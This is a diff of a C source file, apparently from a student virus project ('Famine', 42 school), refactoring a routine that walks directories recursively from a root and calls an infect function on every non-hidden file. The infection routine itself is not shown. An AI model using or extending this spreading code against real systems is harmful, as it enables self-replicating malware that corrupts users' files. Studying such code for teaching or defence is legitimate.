@@ -6,15 +6,15 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:14 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/12 18:03:37 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/26 22:11:30 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include <limits.h>
-#include "famine.h"
-#include "infect.h"
-#include "utils.h"
+
 #include "syscall.h"
+#include "utils.h"
+#include "virus.h"
 
 static void	infect_files_at(char path[PATH_MAX], char *path_end, uint64_t seed[2]);
 
@@ -25,13 +25,13 @@ static void	browse_dirent(char path[PATH_MAX], char *path_end, \
 	{
 		struct dirent64 *file = (struct dirent64*)(buff + bpos);
 
-		ft_strcpy(path_end, file->d_name);
+		strcpy(path_end, file->d_name);
 		if (file->d_name[0] != '.') // we respect your privacy ;)
 		{
 			if (file->d_type == DT_DIR)
-				infect_files_at(path, path_end + ft_strlen(file->d_name), seed);
+				infect_files_at(path, path_end + strlen(file->d_name), seed);
 			else
-				infect_if_candidate(path, seed);
+				infect(path, seed);
 		}
 		bpos += file->d_reclen;
 	}
@@ -55,6 +55,6 @@ inline void		infect_files_in(const char *root_dir, uint64_t seed[2])
 {
 	char	path[PATH_MAX];
 
-	ft_strcpy(path, root_dir);
-	infect_files_at(path, path + ft_strlen(root_dir), seed);
+	strcpy(path, root_dir);
+	infect_files_at(path, path + strlen(root_dir), seed);
 }
